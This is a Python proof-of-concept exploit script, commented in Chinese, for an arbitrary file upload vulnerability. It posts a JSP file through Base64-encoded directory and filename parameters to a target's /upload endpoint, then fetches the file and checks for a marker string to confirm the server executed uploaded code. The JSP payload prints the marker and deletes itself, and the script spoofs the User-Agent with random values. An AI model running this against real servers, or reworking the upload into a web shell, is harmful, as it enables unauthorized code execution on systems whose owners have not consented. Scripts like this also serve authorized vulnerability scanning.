
import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='漏洞存在位置/upload可以上传任意文件，但是需要提供参数cookie',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')


args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/upload"  # 移除末尾的斜杠
        url1 = args.url[:-1] + "/repository/000000000/demo.jsp"
    else:
        url = args.url + "/upload"
        url1 = args.url + "/repository/000000000/demo.jsp"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': fake.user_agent(),
    "Connection": "close",
    "Content-Type": "multipart/form-data; boundary=00contenteboundary00",  # 注意边界值
    "Accept-Encoding": "gzip"
}

# 构造查询参数（Base64 编码参数）
params = {
    "dir": "cmVwb3NpdG9yeQ==",  # 解码为 "repository"
    "name": "ZGVtby5qc3A=",     # 解码为 "demo.jsp"
    "start": "0",
    "size": "7000"
}

# 构造 multipart 请求体
files = {
    "file": (
        "uasifa.jsp",  # 上传文件名
        '''<%%out.printin("pboyjnnrfipmplsukdeczudsefxmywe");new java.io.File(application.getRealPath(request.getservletPath())).delete();%>''',
        "application/octet-stream"
    ),
    "Submit": (None, "Go")  # 提交按钮字段
}


response = requests.post(url=url,
    headers=headers,
    params=params,
    files=files)
response1 = requests.get(url=url1,headers=headers)

if "pboyjnnrfipmplsukdeczudsefxmywe" in response1.text:
    print("目标url："+ url + '\n' +"访问存放的恶意成功\n")
    print(response.text)
else:
    print("目标url："+ url + '\n' +"不存在漏洞")
# print(response.text)